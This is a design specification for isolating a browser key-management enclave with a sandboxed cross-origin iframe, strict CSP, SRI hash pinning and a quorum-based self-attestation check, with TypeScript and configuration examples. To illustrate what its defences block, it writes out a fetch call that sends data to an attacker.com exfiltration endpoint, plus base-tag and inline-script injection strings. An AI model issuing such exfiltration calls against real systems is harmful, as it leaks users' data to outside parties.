# Iframe Isolation & Verifiable Enclave Specification

**Status**: Design Phase
**Version**: V2
**Date**: 2025-01-24

---

## Overview

The KMS enclave runs as a **sandboxed cross-origin iframe** embedded in the main PWA. This document specifies the complete isolation architecture, including:

1. **Minimal HTML bootstrap** (~10 lines, easily auditable)
2. **Strict CSP headers** (zero external resources)
3. **Sandbox configuration** (with security rationale)
4. **Cross-origin isolation** (browser-enforced boundaries)
5. **SRI verification** (hash-pinned module loading)
6. **Integration with self-attestation** (runtime integrity checks)

This architecture makes the KMS enclave **verifiable by inspection** - anyone can audit the ~10-line HTML file and confirm it loads exactly one SRI-pinned module with no external dependencies.

---

## Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────────────┐
│                   Main PWA (allthe.services)                            │
│                                                                         │
│  <iframe src="https://kms.ats.run/kms.html"                             │
│          sandbox="allow-scripts allow-same-origin"                      │
│          referrerpolicy="no-referrer"                                   │
│          csp="default-src 'none'; script-src 'self'; ..."               │
│          allow="none">                                                  │
│                                                                         │
│  ┌───────────────────────────────────────────────────────────────────┐  │
│  │                                                                   │  │
│  │  KMS Enclave (kms.ats.run) - Separate Origin                      │  │
│  │                                                                   │  │
│  │  ┌─────────────────────────────────────────────────────────────┐  │  │
│  │  │  kms.html (10 lines, easily auditable)                      │  │  │
│  │  │                                                             │  │  │
│  │  │  <!doctype html>                                            │  │  │
│  │  │  <meta charset="utf-8">                                     │  │  │
│  │  │  <meta http-equiv="Content-Security-Policy"                 │  │  │
│  │  │        content="default-src 'none'; script-src 'self'; ...">│  │  │
│  │  │  <script type="module"                                      │  │  │
│  │  │          integrity="sha256-abc123..."                       │  │  │
│  │  │          src="/kms-v2.0.0-7f8a9b0c.mjs">                    │  │  │
│  │  │  </script>                                                  │  │  │
│  │  └─────────────────────────────────────────────────────────────┘  │  │
│  │                           │                                       │  │
│  │                           │ SRI verification (browser)            │  │
│  │                           │ Fails if hash mismatch                │  │
│  │                           ↓                                       │  │
│  │  ┌──────────────────────────────────────────────────────────────┐ │  │
│  │  │  kms-v2.0.0-7f8a9b0c.mjs (bundled ESM)                       │ │  │
│  │  │                                                              │ │  │
│  │  │  1. Runtime self-check (fail-secure verification)            │ │  │
│  │  │  2. Initialize Dedicated Worker                              │ │  │
│  │  │  3. Setup postMessage RPC                                    │ │  │
│  │  │  4. Report ready to parent                                   │ │  │
│  │  └──────────────────────────────────────────────────────────────┘ │  │
│  │                           │                                       │  │
│  │                           │ Worker message                        │  │
│  │                           ↓                                       │  │
│  │  ┌─────────────────────────────────────────────────────────────┐  │  │
│  │  │  Dedicated Worker (crypto operations)                       │  │  │
│  │  │                                                             │  │  │
│  │  │  - No DOM access (isolated from phishing)                   │  │  │
│  │  │  - Non-extractable CryptoKeys                               │  │  │
│  │  │  - IndexedDB for encrypted storage                          │  │  │
│  │  │  - Unlock context (withUnlock)                              │  │  │
│  │  └─────────────────────────────────────────────────────────────┘  │  │
│  │                                                                   │  │
│  └───────────────────────────────────────────────────────────────────┘  │
│                           ↑                                             │
│                           │ postMessage RPC (only communication)        │
│                           │                                             │
│  ┌────────────────────────┴────────────────────────────────────────┐    │
│  │  KMS Client (kms-user.ts in PWA)                                │    │
│  │                                                                 │    │
│  │  - Creates iframe                                               │    │
│  │  - Sends RPC requests                                           │    │
│  │  - Validates responses                                          │    │
│  │  - No direct access to keys                                     │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘

Security Boundaries:
  1. Cross-origin (kms.ats.run ≠ allthe.services)
  2. Sandbox (restricted capabilities)
  3. CSP (zero external resources)
  4. SRI (hash-verified code)
  5. Worker isolation (no DOM)
  6. Non-extractable keys (browser crypto subsystem)
```

---

## Component 1: Minimal HTML Bootstrap

### The kms.html File

**File:** `public/kms.html` (generated by CI, content-addressed)

```html
<!doctype html>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; connect-src 'self'; worker-src 'self'; style-src 'none'; img-src 'none'; font-src 'none'; object-src 'none'; media-src 'none'; frame-src 'none'; child-src 'none'; form-action 'none'; frame-ancestors https://allthe.services; base-uri 'none'; manifest-src 'none'">
<title>ATS KMS Enclave</title>
<script type="module" integrity="sha256-f4OxZX/x/FO5LcGBSKHWXfwtSxCeq6d2kqbUqZ5K6fU=" src="/kms-v2.0.0-7f8a9b0c.mjs"></script>
```

**That's it. 5 lines.**

### Design Rationale

**Why so minimal?**
- **Auditability**: Anyone can read and verify this in 10 seconds
- **No hidden code**: Everything is in the SRI-pinned module
- **No external dependencies**: CSP blocks everything except same-origin
- **Content-addressed**: Filename contains hash, immutable

**Why no `<body>` or `<div>`?**
- Worker does all crypto operations (no DOM needed)
- Main thread only forwards postMessage RPC
- Adding UI elements would increase audit surface

**Why no inline scripts?**
- CSP blocks `unsafe-inline` (prevents injection attacks)
- All code must be in SRI-verified modules
- Inline scripts would break verifiability

**Why no styles?**
- No user-facing UI in enclave
- Adding CSS would increase audit surface
- Styles could leak information via timing attacks

### Generation Process

**File:** `build/generate-kms-html.ts`

```typescript
import { readFileSync, writeFileSync } from 'fs';
import { createHash } from 'crypto';

/**
 * Generates kms.html with SRI hash for the built artifact.
 *
 * Called by CI after reproducible build.
 */
export function generateKMSHtml(options: {
  artifactPath: string;   // e.g., dist/kms-v2.0.0-7f8a9b0c.mjs
  outputPath: string;     // e.g., dist/kms.html
  version: string;        // e.g., v2.0.0
  parentOrigin: string;   // e.g., https://allthe.services
}) {
  // Read artifact
  const artifact = readFileSync(options.artifactPath);

  // Compute SRI hash
  const sri = computeSRI(artifact);

  // Extract filename
  const filename = options.artifactPath.split('/').pop()!;

  // Generate HTML
  const html = `<!doctype html>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; connect-src 'self'; worker-src 'self'; style-src 'none'; img-src 'none'; font-src 'none'; object-src 'none'; media-src 'none'; frame-src 'none'; child-src 'none'; form-action 'none'; frame-ancestors ${options.parentOrigin}; base-uri 'none'; manifest-src 'none'">
<title>ATS KMS Enclave</title>
<script type="module" integrity="${sri}" src="/${filename}"></script>
`;

  // Write to output
  writeFileSync(options.outputPath, html, 'utf-8');

  console.log('Generated kms.html:');
  console.log(`  File: ${options.outputPath}`);
  console.log(`  SRI: ${sri}`);
  console.log(`  Module: ${filename}`);
}

function computeSRI(data: Buffer): string {
  const hash = createHash('sha256').update(data).digest('base64');
  return `sha256-${hash}`;
}
```

### CI Integration

**Workflow:** `.github/workflows/release.yml`

```yaml
- name: Build reproducible artifact
  run: pnpm build:reproducible
  env:
    SOURCE_DATE_EPOCH: ${{ steps.get-timestamp.outputs.timestamp }}

- name: Generate kms.html
  run: |
    node build/generate-kms-html.ts \
      --artifact dist/kms-v${{ env.VERSION }}-*.mjs \
      --output dist/kms.html \
      --version ${{ env.VERSION }} \
      --parent-origin https://allthe.services

- name: Verify kms.html is minimal
  run: |
    # Ensure kms.html has exactly 5 lines (no bloat)
    LINES=$(wc -l < dist/kms.html)
    if [ "$LINES" -ne 5 ]; then
      echo "❌ kms.html has $LINES lines (expected 5)"
      exit 1
    fi

    # Ensure no inline scripts
    if grep -q '<script>' dist/kms.html; then
      echo "❌ kms.html contains inline script"
      exit 1
    fi

    echo "✅ kms.html is minimal (5 lines, no inline scripts)"
```

---

## Component 2: Content Security Policy (CSP)

### KMS Enclave CSP

**Applied via:** `<meta http-equiv="Content-Security-Policy">` in kms.html

**Full policy:**

```
default-src 'none';
script-src 'self';
connect-src 'self';
worker-src 'self';
style-src 'none';
img-src 'none';
font-src 'none';
object-src 'none';
media-src 'none';
frame-src 'none';
child-src 'none';
form-action 'none';
frame-ancestors https://allthe.services;
base-uri 'none';
manifest-src 'none';
```

### Directive Breakdown

| Directive | Value | Rationale |
|-----------|-------|-----------|
| `default-src` | `'none'` | Deny everything by default (strictest) |
| `script-src` | `'self'` | Only same-origin scripts (no CDN, no inline) |
| `connect-src` | `'self'` | Only same-origin fetch/XHR (self-verification, badge fetch) |
| `worker-src` | `'self'` | Only same-origin workers (dedicated worker) |
| `style-src` | `'none'` | No styles (no UI in enclave) |
| `img-src` | `'none'` | No images |
| `font-src` | `'none'` | No fonts |
| `object-src` | `'none'` | No plugins/embeds |
| `media-src` | `'none'` | No audio/video |
| `frame-src` | `'none'` | No nested iframes |
| `child-src` | `'none'` | No nested browsing contexts |
| `form-action` | `'none'` | No form submissions |
| `frame-ancestors` | `https://allthe.services` | Only embeddable by PWA |
| `base-uri` | `'none'` | Cannot set `<base>` (prevents URL injection) |
| `manifest-src` | `'none'` | No web app manifest |

### Security Properties

**What this prevents:**

✅ **External script injection**
- `script-src 'self'` blocks all CDN/external scripts
- Only same-origin modules can load
- No `unsafe-inline`, no `unsafe-eval`

✅ **Data exfiltration**
- `connect-src 'self'` blocks external fetch/XHR
- Keys cannot be sent to attacker-controlled servers
- Only same-origin requests (self-verification, badge.json)

✅ **Clickjacking**
- `frame-ancestors https://allthe.services` allows only PWA to embed
- Prevents attacker sites from embedding KMS
- Prevents UI redressing attacks

✅ **Inline script injection**
- No `unsafe-inline` means XSS cannot execute inline JS
- All code must be in SRI-verified modules
- Even if attacker injects `<script>alert(1)</script>`, it won't run

✅ **Base tag injection**
- `base-uri 'none'` prevents `<base href="https://attacker.com">`
- Protects relative URL resolution
- Prevents module hijacking

### CDN/Server-Side CSP

**Additionally, the CDN serving kms.ats.run should send HTTP headers:**

```http
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; worker-src 'self'; style-src 'none'; img-src 'none'; font-src 'none'; object-src 'none'; media-src 'none'; frame-src 'none'; child-src 'none'; form-action 'none'; frame-ancestors https://allthe.services; base-uri 'none'; manifest-src 'none'
X-Frame-Options: ALLOW-FROM https://allthe.services
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer
Permissions-Policy: geolocation=(), camera=(), microphone=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=()
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
```

**Why both `<meta>` and HTTP headers?**
- **Defense in depth**: If CDN misconfigured, HTML meta tag still applies
- **Meta tag is verifiable**: Auditors can see CSP in kms.html
- **HTTP headers are preferred**: Browsers apply HTTP CSP before parsing HTML

### Permissions-Policy

```
Permissions-Policy:
  geolocation=(),
  camera=(),
  microphone=(),
  payment=(),
  usb=(),
  magnetometer=(),
  gyroscope=(),
  accelerometer=(),
  ambient-light-sensor=(),
  autoplay=(),
  battery=(),
  display-capture=(),
  document-domain=(),
  encrypted-media=(),
  fullscreen=(),
  gamepad=(),
  hid=(),
  idle-detection=(),
  local-fonts=(),
  midi=(),
  picture-in-picture=(),
  publickey-credentials-get=(),
  screen-wake-lock=(),
  serial=(),
  web-share=()
```

**Rationale:** Deny ALL browser features except essential ones (crypto, storage).

---

## Component 3: Sandbox Configuration

### Iframe Sandbox Attributes

**In the PWA (allthe.services):**

```html
<iframe
  id="kms-enclave"
  src="https://kms.ats.run/kms.html"
  sandbox="allow-scripts allow-same-origin"
  referrerpolicy="no-referrer"
  allow="none"
  style="display: none; width: 0; height: 0; border: none;">
</iframe>
```

### Attribute Breakdown

| Attribute | Value | Rationale |
|-----------|-------|-----------|
| `sandbox` | `allow-scripts allow-same-origin` | See security decision below |
| `referrerpolicy` | `no-referrer` | Don't leak PWA URL to KMS requests |
| `allow` | `none` | Deny all Permissions-Policy features |
| `style` | `display: none` | No UI (hidden iframe) |

### Security Decision: `allow-same-origin`

**Common advice:** "Never use `allow-scripts` with `allow-same-origin`"

**Why this is safe here:**

1. **Cross-origin isolation is the real boundary**
   - `kms.ats.run` ≠ `allthe.services` (different origins)
   - Browser enforces same-origin policy regardless of sandbox
   - KMS cannot access PWA cookies, localStorage, IndexedDB

2. **Without `allow-same-origin`, we get opaque origin (`null`)**
   - CSP `connect-src 'self'` doesn't work (`'self'` = `null` ≠ `kms.ats.run`)
   - Runtime self-check breaks (`fetch(import.meta.url)` blocked)
   - IndexedDB behavior unreliable
   - Cannot fetch `badge.json` from same origin

3. **Sandboxing alone is not the security boundary**
   - Sandbox is defense-in-depth layer #2
   - Primary boundary is cross-origin + CSP
   - We don't rely on sandbox for isolation

**Isolation layers (in order):**

1. **Cross-origin** (primary): `kms.ats.run` ≠ `allthe.services`
2. **CSP** (primary): Zero external resources
3. **Sandbox** (defense-in-depth): No popups, no navigation
4. **Worker** (defense-in-depth): No DOM access
5. **Non-extractable keys** (primary): Browser crypto subsystem

**What sandbox DOES provide:**

- ✅ Prevents `window.open()` (no popup spam)
- ✅ Prevents `window.top.location = ...` (no navigation hijacking)
- ✅ Prevents form submissions (no POST to attacker sites)
- ✅ Prevents download attribute (no unwanted downloads)

**What sandbox does NOT need to provide:**

- ❌ Cross-origin isolation (already have different origins)
- ❌ Script execution blocking (we want scripts, but SRI-verified)
- ❌ Same-origin data access blocking (no sensitive data on kms.ats.run)

### Alternative: Opaque Origin

**If we used `sandbox="allow-scripts"` (no `allow-same-origin`):**

```html
<!-- Opaque origin sandbox -->
<iframe sandbox="allow-scripts" src="https://kms.ats.run/kms.html">
```

**Consequences:**

```javascript
// Inside iframe
console.log(location.origin);  // "null" (opaque origin)

// This FAILS (CSP 'self' = null ≠ kms.ats.run)
fetch('https://kms.ats.run/badge.json');  // ❌ Blocked by CSP

// This FAILS (cannot fetch from blob: in opaque origin)
fetch(import.meta.url);  // ❌ Blocked by CSP

// This WORKS (relative URL, but still blocked by CSP 'self' = null)
fetch('/badge.json');  // ❌ Blocked by CSP

// IndexedDB works but with restrictions
indexedDB.open('kms');  // ✅ Works but may be cleared more aggressively
```

**Verdict:** Opaque origin breaks runtime verification and CSP self-references. Not viable.

---

## Component 4: Cross-Origin Isolation

### Origin Separation

**Main PWA:** `https://allthe.services`
**KMS Enclave:** `https://kms.ats.run`

**Why different origins?**
- Browser same-origin policy enforces isolation
- KMS cannot access PWA cookies, localStorage, sessionStorage
- KMS cannot access PWA IndexedDB
- KMS cannot navigate PWA window
- KMS cannot read PWA DOM

### Communication Boundary

**ONLY postMessage:**

```typescript
// In PWA (allthe.services)
iframe.contentWindow.postMessage(
  { method: 'generateVAPID', id: 'req-123' },
  'https://kms.ats.run'  // targetOrigin (required)
);

// In KMS (kms.ats.run)
window.addEventListener('message', (event) => {
  // Verify sender
  if (event.origin !== 'https://allthe.services') {
    console.error('Unexpected origin:', event.origin);
    return;
  }

  // Process request
  handleRPC(event.data);
});
```

**Security properties:**

- ✅ **Explicit communication**: No ambient authority
- ✅ **Origin-checked**: Both sides verify sender/receiver
- ✅ **Serializable data only**: No direct object references
- ✅ **Auditable**: All messages visible in DevTools

### What KMS CANNOT Access

**PWA resources (allthe.services):**
- ❌ Cookies (different origin)
- ❌ localStorage/sessionStorage (different origin)
- ❌ IndexedDB (different origin)
- ❌ Service Worker (different origin)
- ❌ DOM (cross-origin iframe, no `contentDocument`)
- ❌ Parent window navigation (`window.top` restrictions)

**External resources:**
- ❌ CDN scripts (CSP `script-src 'self'`)
- ❌ API endpoints (CSP `connect-src 'self'`)
- ❌ Images/fonts/styles (CSP denies all)
- ❌ Tracking pixels (CSP `img-src 'none'`)

**KMS can ONLY access:**
- ✅ Same-origin files (kms.ats.run)
- ✅ IndexedDB (kms.ats.run origin)
- ✅ WebCrypto API (browser built-in)
- ✅ Dedicated Workers (same-origin)
- ✅ postMessage to/from PWA

---

## Component 5: Subresource Integrity (SRI)

### SRI Verification Flow

```
1. Browser parses kms.html
   ↓
2. Sees <script type="module" integrity="sha256-abc..." src="/kms.mjs">
   ↓
3. Fetches /kms.mjs from kms.ats.run
   ↓
4. Computes SHA-256 of fetched file
   ↓
5. Compares with integrity attribute
   ↓
6a. MATCH → Execute module
6b. MISMATCH → Refuse to execute, throw error
```

### SRI Tag Format

```html
<script
  type="module"
  integrity="sha256-f4OxZX/x/FO5LcGBSKHWXfwtSxCeq6d2kqbUqZ5K6fU="
  src="/kms-v2.0.0-7f8a9b0c.mjs">
</script>
```

**Components:**

- `type="module"` - ES module (not classic script)
- `integrity="sha256-..."` - SRI hash (base64-encoded SHA-256)
- `src="/kms-v2.0.0-7f8a9b0c.mjs"` - Content-addressed filename

### Hash Computation

```bash
# Method 1: openssl
SRI=$(openssl dgst -sha256 -binary kms.mjs | openssl base64 -A)
echo "sha256-$SRI"

# Method 2: Node.js
node -e "
const fs = require('fs');
const crypto = require('crypto');
const data = fs.readFileSync('kms.mjs');
const hash = crypto.createHash('sha256').update(data).digest('base64');
console.log('sha256-' + hash);
"
```

### Content-Addressed Filenames

**Format:** `kms-v{version}-{hash8}.mjs`

**Example:** `kms-v2.0.0-7f8a9b0c.mjs`

**Why?**
- **Immutable**: Hash in filename guarantees content never changes
- **Cacheable**: CDN can cache forever (no invalidation needed)
- **Auditable**: Security researchers can reference exact version+hash
- **Versioned**: Easy to identify which release is deployed

**Generation:**

```typescript
function generateContentAddressedFilename(
  version: string,
  content: Buffer
): string {
  const hash = createHash('sha256').update(content).digest('hex');
  const hash8 = hash.slice(0, 8);  // First 8 chars for brevity
  return `kms-v${version}-${hash8}.mjs`;
}
```

### SRI + Content-Addressing = Verifiability

**Verification by inspection:**

1. User visits `https://kms.ats.run/kms.html`
2. Views page source (5 lines, easy to read)
3. Sees `<script integrity="sha256-f4OxZX..." src="/kms-v2.0.0-7f8a9b0c.mjs">`
4. Knows:
   - Browser will verify hash before execution
   - Filename indicates v2.0.0 with hash 7f8a9b0c
   - Can check verification runs for matching hash

**Community verification:**

1. Security researcher runs `node tools/verify-kms.js --release v2.0.0`
2. Script rebuilds from source
3. Computes hash: `7f8a9b0c3d4e5f6a...`
4. Fetches live: `https://kms.ats.run/kms-v2.0.0-7f8a9b0c.mjs`
5. Compares hashes
6. Checks SRI in kms.html matches
7. Confirms: Deployed artifact = audited source

---

## Component 6: Integration with Self-Attestation

### Runtime Self-Check with 2-of-3 Quorum

**File:** `src/main.ts` (inside kms-v2.0.0-*.mjs)

```typescript
/**
 * KMS Enclave Entry Point
 *
 * Runs in cross-origin sandboxed iframe.
 *
 * SECURITY: 2-of-3 quorum verification (fail-secure by default)
 */

async function init() {
  console.log('🔐 KMS Enclave v2.0.0 starting...');

  // Step 1: Runtime self-check with 2-of-3 quorum
  const verification = await verifyDeploymentWithQuorum();

  if (verification.decision === 'FAIL_SECURE') {
    console.error('❌ Deployment verification failed');
    console.error('Quorum:', verification.evidence.quorum);
    console.error('Failed sources:', verification.evidence.sources.filter(s => !s.pass));
    renderFailSecureUI(verification.evidence);
    return; // Stop here - don't initialize crypto operations
  }

  console.log('✅ Deployment verified:', verification.evidence.quorum);
  console.log('Passed sources:', verification.evidence.sources.filter(s => s.pass).map(s => s.name));

  // Step 2: Initialize Worker
  const worker = new Worker('/worker.js', { type: 'module' });

  // Step 3: Setup postMessage RPC
  initRPC(worker);

  // Step 4: Report ready to parent
  window.parent.postMessage(
    { type: 'kms-ready', version: 'v2.0.0', attestation: verification.evidence },
    'https://allthe.services'
  );

  console.log('🔐 KMS Enclave ready');
}

init();
```

### Attestation Decision Logic with 2-of-3 Quorum

**File:** `src/verify-deployment.ts`

```typescript
import { bootVerificationCached } from './fail-secure-verification.js';

/**
 * Attestation decision inputs.
 */
interface AttestationInputs {
  badge: {
    data: BadgeData;           // Signed badge.json
    signature: string;
    generated_at: number;      // Unix timestamp (ms)
    expires_at: number;        // Unix timestamp (ms)
    bundle_sha256: string;
  } | null;
  manifest: {
    bundle_sha256: string;
    signature: string;         // Signed with pinned verification key
  } | null;
  actualHash: string;          // Content-addressed hash of loaded bundle
}

interface BadgeData {
  version: string;
  bundle_sha256: string;
  generated_at: number;
  expires_at: number;
}

/**
 * Verification source result.
 */
interface SourceResult {
  name: string;
  pass: boolean;
  error?: string;
  details?: Record<string, unknown>;
}

/**
 * Verifies deployed KMS artifact using 2-of-3 quorum.
 *
 * QUORUM POLICY:
 * - Accept "operate" state only if **2 of 3** sources agree:
 *   1) badge verifies AND not expired (now < expires_at)
 *   2) manifest signature verifies for the same bundle_sha256
 *   3) the actually fetched module hash equals bundle_sha256
 *
 * - Cache last-known-good badge for transient fetch errors
 * - On transient error + fresh cached badge: continue in "operate"
 * - Otherwise: enter "fail-secure" with error page and evidence links
 *
 * @returns { decision: 'OPERATE' | 'FAIL_SECURE', evidence }
 */
export async function verifyDeploymentWithQuorum(): Promise<BootResult> {
  try {
    // Fetch all inputs
    const inputs = await fetchAttestationInputs();
    const now = Date.now();

    // Verify each source independently
    const sources: SourceResult[] = [];

    // Source 1: Badge verification (signature + TTL)
    const badgeResult = await verifyBadge(inputs.badge, now);
    sources.push(badgeResult);

    // Source 2: Manifest verification (signature)
    const manifestResult = await verifyManifest(inputs.manifest, inputs.actualHash);
    sources.push(manifestResult);

    // Source 3: Actual hash matches expected
    const hashResult = verifyActualHash(
      inputs.actualHash,
      inputs.badge?.bundle_sha256,
      inputs.manifest?.bundle_sha256
    );
    sources.push(hashResult);

    // Count passes
    const passedCount = sources.filter(s => s.pass).length;
    const quorum = { required: 2, passed: passedCount };

    // Decision
    if (passedCount >= 2) {
      // Cache successful badge for future transient errors
      if (badgeResult.pass && inputs.badge) {
        await cacheLastKnownGoodBadge(inputs.badge);
      }

      return {
        decision: 'OPERATE',
        evidence: {
          currentHash: inputs.actualHash,
          currentVersion: extractVersionFromUrl(import.meta.url),
          sources,
          quorum,
          timestamp: new Date().toISOString()
        }
      };
    } else {
      // Check for transient error scenario
      const cachedBadge = await loadCachedBadge();
      if (cachedBadge && now < cachedBadge.expires_at) {
        // Cached badge is still fresh - allow operation
        console.warn('Using cached badge due to transient fetch error');
        return {
          decision: 'OPERATE',
          evidence: {
            currentHash: inputs.actualHash,
            currentVersion: extractVersionFromUrl(import.meta.url),
            sources: [
              ...sources,
              { name: 'cached-badge', pass: true, details: { expires_at: cachedBadge.expires_at } }
            ],
            quorum: { required: 2, passed: passedCount + 1 },
            timestamp: new Date().toISOString(),
            note: 'Using cached badge (transient fetch error)'
          }
        };
      }

      // FAIL SECURE
      return {
        decision: 'FAIL_SECURE',
        evidence: {
          currentHash: inputs.actualHash,
          currentVersion: extractVersionFromUrl(import.meta.url),
          sources,
          quorum,
          timestamp: new Date().toISOString()
        }
      };
    }
  } catch (err) {
    console.error('Boot verification failed:', err);

    return {
      decision: 'FAIL_SECURE',
      evidence: {
        currentHash: 'unknown',
        currentVersion: extractVersionFromUrl(import.meta.url),
        sources: [],
        quorum: { required: 2, passed: 0 },
        timestamp: new Date().toISOString(),
        error: err.message
      }
    };
  }
}

/**
 * Verify badge: signature + TTL.
 */
async function verifyBadge(
  badge: AttestationInputs['badge'],
  now: number
): Promise<SourceResult> {
  if (!badge) {
    return { name: 'badge', pass: false, error: 'Badge not available' };
  }

  try {
    // Check TTL
    if (now >= badge.expires_at) {
      return {
        name: 'badge',
        pass: false,
        error: 'Badge expired',
        details: { expires_at: badge.expires_at, now }
      };
    }

    // Verify Sigstore signature (OIDC)
    const signatureValid = await verifySigstoreSignature(badge.data, badge.signature);
    if (!signatureValid) {
      return { name: 'badge', pass: false, error: 'Invalid signature' };
    }

    return {
      name: 'badge',
      pass: true,
      details: {
        generated_at: badge.generated_at,
        expires_at: badge.expires_at,
        bundle_sha256: badge.bundle_sha256
      }
    };
  } catch (err) {
    return { name: 'badge', pass: false, error: err.message };
  }
}

/**
 * Verify manifest: signature for bundle hash.
 */
async function verifyManifest(
  manifest: AttestationInputs['manifest'],
  actualHash: string
): Promise<SourceResult> {
  if (!manifest) {
    return { name: 'manifest', pass: false, error: 'Manifest not available' };
  }

  try {
    // Verify signature with pinned key
    const signatureValid = await verifyManifestSignature(
      manifest.bundle_sha256,
      manifest.signature
    );

    if (!signatureValid) {
      return { name: 'manifest', pass: false, error: 'Invalid signature' };
    }

    // Check hash matches
    if (manifest.bundle_sha256 !== actualHash) {
      return {
        name: 'manifest',
        pass: false,
        error: 'Hash mismatch',
        details: { expected: manifest.bundle_sha256, actual: actualHash }
      };
    }

    return {
      name: 'manifest',
      pass: true,
      details: { bundle_sha256: manifest.bundle_sha256 }
    };
  } catch (err) {
    return { name: 'manifest', pass: false, error: err.message };
  }
}

/**
 * Verify actual hash matches expected from badge and/or manifest.
 */
function verifyActualHash(
  actualHash: string,
  badgeSha256: string | undefined,
  manifestSha256: string | undefined
): SourceResult {
  const expected = badgeSha256 || manifestSha256;
  if (!expected) {
    return {
      name: 'actual-hash',
      pass: false,
      error: 'No expected hash available'
    };
  }

  if (actualHash === expected) {
    return {
      name: 'actual-hash',
      pass: true,
      details: { hash: actualHash }
    };
  } else {
    return {
      name: 'actual-hash',
      pass: false,
      error: 'Hash mismatch',
      details: { expected, actual: actualHash }
    };
  }
}

/**
 * Fetch attestation inputs (badge, manifest, actual hash).
 */
async function fetchAttestationInputs(): Promise<AttestationInputs> {
  // Fetch badge.json
  let badge: AttestationInputs['badge'] = null;
  try {
    const badgeRes = await fetch('/badge.json', { cache: 'no-store' });
    if (badgeRes.ok) {
      const badgeData = await badgeRes.json();
      badge = {
        data: badgeData,
        signature: badgeData.signature,
        generated_at: badgeData.generated_at,
        expires_at: badgeData.expires_at,
        bundle_sha256: badgeData.bundle_sha256
      };
    }
  } catch (err) {
    console.warn('Failed to fetch badge.json:', err);
  }

  // Fetch manifest
  let manifest: AttestationInputs['manifest'] = null;
  try {
    const manifestRes = await fetch('/manifest.json', { cache: 'no-store' });
    if (manifestRes.ok) {
      manifest = await manifestRes.json();
    }
  } catch (err) {
    console.warn('Failed to fetch manifest.json:', err);
  }

  // Compute actual hash
  const actualHash = await computeActualHash();

  return { badge, manifest, actualHash };
}

/**
 * Compute SHA-256 of currently loaded bundle.
 */
async function computeActualHash(): Promise<string> {
  const moduleUrl = import.meta.url;
  const response = await fetch(moduleUrl, { cache: 'force-cache' });
  const moduleBytes = await response.arrayBuffer();
  const hashBytes = await crypto.subtle.digest('SHA-256', moduleBytes);
  return arrayBufferToHex(hashBytes);
}

/**
 * Cache last-known-good badge for transient error handling.
 */
async function cacheLastKnownGoodBadge(badge: AttestationInputs['badge']): Promise<void> {
  if (!badge) return;

  const cache = {
    badge,
    cachedAt: Date.now()
  };

  // Store in IndexedDB (persistent)
  await indexedDB.put('kms:cache:badge', cache);
}

/**
 * Load cached badge.
 */
async function loadCachedBadge(): Promise<AttestationInputs['badge']> {
  const cache = await indexedDB.get('kms:cache:badge');
  return cache?.badge || null;
}
```

### Fetch Permission (CSP connect-src 'self')

**Allowed requests:**

```typescript
// ✅ ALLOWED: Same-origin badge fetch
const badge = await fetch('https://kms.ats.run/badge.json');

// ✅ ALLOWED: Self-verification
const self = await fetch(import.meta.url);

// ✅ ALLOWED: Worker fetch
const worker = new Worker('/worker.js');

// ❌ BLOCKED: External fetch
const evil = await fetch('https://attacker.com/exfiltrate');
// Error: Blocked by Content Security Policy
```

### Verification Evidence Display

**If verification passes (quorum ≥ 2/3):**

```typescript
// Normal operation - no UI
// Status visible via PWA settings (postMessage RPC)
```

**If verification fails (quorum < 2/3):**

```typescript
// Render fail-secure incident UI
function renderFailSecureUI(evidence: VerificationEvidence) {
  document.body.innerHTML = `
    <div class="fail-secure">
      <h1>🚨 KMS Integrity Verification Failed</h1>
      <p>Crypto operations are locked for your protection.</p>

      <h2>Verification Status</h2>
      <p>Required: ${evidence.quorum.required}/3 sources</p>
      <p>Passed: ${evidence.quorum.passed}/3 sources</p>

      <h2>Sources</h2>
      ${evidence.sources.map(s => `
        <div class="${s.pass ? 'pass' : 'fail'}">
          ${s.pass ? '✅' : '❌'} ${s.name}
          ${s.error ? `<p>Error: ${s.error}</p>` : ''}
        </div>
      `).join('')}

      <h2>Current Deployment</h2>
      <table>
        <tr><th>Version:</th><td>${evidence.currentVersion}</td></tr>
        <tr><th>Hash:</th><td><code>${evidence.currentHash}</code></td></tr>
        <tr><th>Checked:</th><td>${evidence.timestamp}</td></tr>
      </table>

      <h2>What You Should Do</h2>
      <ol>
        <li>Check <a href="${getVerificationRunsURL()}">recent verification runs</a></li>
        <li>Reload in 15 minutes (may be temporary)</li>
        <li>If persistent >6h, email security@ats.run</li>
      </ol>
    </div>
  `;
}
```

---

## Security Properties (Complete)

### What This Architecture Achieves

✅ **Verifiable by inspection**
- kms.html is 5 lines, anyone can audit
- Single SRI-pinned module (no hidden dependencies)
- CSP visible in HTML (defense-in-depth vs misconfigured CDN)

✅ **Browser-enforced isolation**
- Cross-origin prevents cookie/storage access
- Sandbox prevents popups/navigation
- CSP prevents external resources
- SRI prevents tampered code execution

✅ **Zero trust in CDN**
- SRI hash must match or browser refuses to load
- Content-addressed filenames prevent caching attacks
- Runtime self-check adds fail-secure verification

✅ **Zero trust in developers**
- Reproducible builds allow community verification
- Self-attestation provides continuous monitoring
- Git commit history is tamper-evident

✅ **Minimal attack surface**
- ~500 lines total code (auditable)
- No external dependencies
- No DOM manipulation (Worker does crypto)
- No network except same-origin verification

✅ **Fail-secure by default**
- Verification failure locks operations
- Clear incident response UI
- Evidence collection for post-mortem

### What This Does NOT Achieve

❌ **Browser implementation bugs**
- Still trusting WebCrypto, SRI, CSP implementations
- Browser vulnerabilities could compromise isolation
- Defense: Keep browser updated, use latest stable versions

❌ **Malicious browser extensions**
- Extensions can access all page content
- Extensions can intercept postMessage
- Defense: Use dedicated browser profile without extensions

❌ **Source code compromise**
- If malicious code merged to Git, verification passes
- Community must audit source code
- Defense: Code review, open source transparency

❌ **Physical device access**
- Attacker with device access can read memory
- Cold boot attacks, hardware keyloggers
- Defense: Disk encryption, secure boot, physical security

❌ **Compromised OS**
- OS-level malware can access all browser data
- Keyloggers can capture passphrases
